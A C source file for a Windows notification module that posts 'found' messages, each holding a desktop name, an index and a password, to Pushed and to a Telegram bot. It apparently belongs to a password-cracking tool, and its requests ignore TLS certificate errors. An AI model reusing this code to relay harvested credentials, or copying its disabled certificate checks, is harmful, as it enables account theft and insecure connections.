#include "includes.h"
#include <wininet.h>

#include "pushed.h"

static char szAppKey[128],szAppSecret[128],szAppAlias[128];
static DWORD dwInterval;
static void Notify_SendPushed(LPCSTR lpContent)
{
    HINTERNET hInternet=InternetOpenA(NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    if (hInternet)
    {
        HINTERNET hConnect=InternetConnectA(hInternet,"api.pushed.co",INTERNET_DEFAULT_HTTPS_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,INTERNET_FLAG_SECURE,0);
        if (hConnect)
        {
            HINTERNET hRequest=HttpOpenRequestA(hConnect,"POST","/1/push",NULL,NULL,0,INTERNET_FLAG_SECURE|INTERNET_FLAG_KEEP_CONNECTION|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,0);
            if (hRequest)
            {
                char szRequest[1024];
                wsprintfA(szRequest,"app_key=%s&app_secret=%s&target_type=app&target_alias=%s&content=%s",szAppKey,szAppSecret,szAppAlias,lpContent);

                if (HttpSendRequestA(hRequest,"Content-Type: application/x-www-form-urlencoded",-1,szRequest,lstrlenA(szRequest)))
                {
                    char szResult[1024];
                    while (true)
                    {
                        DWORD dwBytesRead;
                        BOOL bRead=InternetReadFile(hRequest,szResult,sizeof(szResult)-1,&dwBytesRead);

                        if ((bRead == FALSE) || (dwBytesRead == 0))
                            break;

                        szResult[dwBytesRead]=0;
                    }

                    if (!StrStrA(szResult,"shipment_successfully_sent"))
                        DebugLog_AddItem2(NULL,LOG_LEVEL_WARNING,"SendNotify() %s",szResult);
                }
                else
                    DebugLog_AddItem2(NULL,LOG_LEVEL_WARNING,"SendNotify() HttpSendRequestA(%x) failed!",GetLastError());

                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    return;
}

static char szTelegramUrl[256],szTelegramChatId[128];
static void Notify_SendTelegram(LPCSTR lpContent)
{
    HINTERNET hInternet=InternetOpenA(NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    if (hInternet)
    {
        HINTERNET hConnect=InternetConnectA(hInternet,"api.telegram.org",INTERNET_DEFAULT_HTTPS_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,INTERNET_FLAG_SECURE,0);
        if (hConnect)
        {
            HINTERNET hRequest=HttpOpenRequestA(hConnect,"POST",szTelegramUrl,NULL,NULL,0,INTERNET_FLAG_SECURE|INTERNET_FLAG_KEEP_CONNECTION|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,0);
            if (hRequest)
            {
                char szRequest[1024];
                wsprintfA(szRequest,"chat_id=%s&text=%s",szTelegramChatId,lpContent);

                if (HttpSendRequestA(hRequest,"Content-Type: application/x-www-form-urlencoded",-1,szRequest,lstrlenA(szRequest)))
                {
                    char szResult[1024];
                    while (true)
                    {
                        DWORD dwBytesRead;
                        BOOL bRead=InternetReadFile(hRequest,szResult,sizeof(szResult)-1,&dwBytesRead);

                        if ((bRead == FALSE) || (dwBytesRead == 0))
                            break;

                        szResult[dwBytesRead]=0;
                    }

                    if (!StrStrA(szResult,"\"ok\":true"))
                        DebugLog_AddItem2(NULL,LOG_LEVEL_WARNING,"SendNotify() %s",szResult);
                }
                else
                    DebugLog_AddItem2(NULL,LOG_LEVEL_WARNING,"SendNotify() HttpSendRequestA(%x) failed!",GetLastError());

                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    return;
}

static PNOTIFY lpNotify;
static CRITICAL_SECTION csNotify;
static bool bPushed=false,bTelegram=false;
static void WINAPI NotifyThread(LPVOID)
{
    if ((!bPushed) && (!bTelegram))
        return;

    while (WaitForSingleObject(hShutdownEvent,dwInterval) == WAIT_TIMEOUT)
    {
        PNOTIFY lpCurNotify=NULL;
        EnterCriticalSection(&csNotify);
        {
            lpCurNotify=lpNotify;

            if (lpCurNotify)
                lpNotify=lpCurNotify->lpNext;
        }
        LeaveCriticalSection(&csNotify);

        if (lpCurNotify)
        {
            if (bPushed)
                Notify_SendPushed(lpCurNotify->szContent);

            if (bTelegram)
                Notify_SendTelegram(lpCurNotify->szContent);

            MemFree((lpCurNotify));
        }
    }
    return;
}

static bool bFound=false;
void Notify_SendFound(LPCSTR lpDesktop,DWORD dwIdx,LPCSTR lpPassword)
{
    if ((bFound) && ((bPushed) || (bTelegram)))
    {
        char szContent[256]={0};
        LPSTR lpPtr=StrStrA(lpDesktop," ( ");
        if (lpPtr)
            StrCpyNA(szContent,lpDesktop,(lpPtr-lpDesktop+1)/sizeof(szContent[0]));
        else if (!StrCmpNA(lpDesktop,"QEMU (",6))
        {
            lstrcpyA(szContent,lpDesktop+6);
            szContent[lstrlenA(szContent)-1]=0;
        }
        else
            lstrcpyA(szContent,lpDesktop);

        char szIdx[100]={0};
        wsprintfA(szIdx," [%d - %s]",dwIdx,lpPassword);

        lstrcatA(szContent,szIdx);

        DWORD dwContentLen=lstrlenA(szContent);
        if (dwContentLen > 120)
            dwContentLen=120;

        char szContextEncoded[300]={0};
        NetUrlEncodeBufferA(szContent,dwContentLen,szContextEncoded,ARRAYSIZE(szContextEncoded));

        PNOTIFY lpNewNotify=(PNOTIFY)MemQuickAlloc(sizeof(*lpNewNotify));
        if (lpNewNotify)
        {
            lstrcpyA(lpNewNotify->szContent,szContextEncoded);

            EnterCriticalSection(&csNotify);
            {
                lpNewNotify->lpNext=lpNotify;
                lpNotify=lpNewNotify;
            }
            LeaveCriticalSection(&csNotify);
        }
    }
    return;
}

static bool bOffline=false;
void Notify_SendOffline(LPCSTR lpWorker)
{
    if ((bOffline) && ((bPushed) || (bTelegram)))
    {
///
    }
    return;
}

void Notify_Init(cJSON *jsConfig)
{
    Splash_SetText(_T("Initializing notifications..."));

    InitializeCriticalSection(&csNotify);

    cJSON *jsNotify=cJSON_GetObjectItem(jsConfig,"notify");
    if (jsNotify)
    {
        bOffline=cJSON_GetBoolFromObject(jsNotify,"offline");
        bFound=cJSON_GetBoolFromObject(jsNotify,"found");
        if ((bFound) || (bOffline))
        {
            cJSON *jsPushed=cJSON_GetObjectItem(jsNotify,"pushed");
            if (jsPushed)
            {
                lstrcpyA(szAppKey,cJSON_GetStringFromObject(jsPushed,"app_key"));
                lstrcpyA(szAppSecret,cJSON_GetStringFromObject(jsPushed,"app_secret"));
                lstrcpyA(szAppAlias,cJSON_GetStringFromObject(jsPushed,"app_alias"));
                dwInterval=(DWORD)cJSON_GetIntFromObject(jsPushed,"interval");

                bPushed=((szAppKey[0]) && (szAppSecret[0]) && (szAppAlias[0]));
            }

            cJSON *jsTelegram=cJSON_GetObjectItem(jsNotify,"telegram");
            if (jsTelegram)
            {
                wsprintfA(szTelegramUrl,"/bot%s/sendMessage",cJSON_GetStringFromObject(jsTelegram,"key"));
                lstrcpyA(szTelegramChatId,cJSON_GetStringFromObject(jsTelegram,"id"));

                bTelegram=((szTelegramUrl[0]) && (szTelegramChatId[0]));
            }
        }
    }

    ThreadsGroup_CreateThread(hThreadsGroup,0,(LPTHREAD_START_ROUTINE)NotifyThread,NULL,0,NULL);
    return;
}

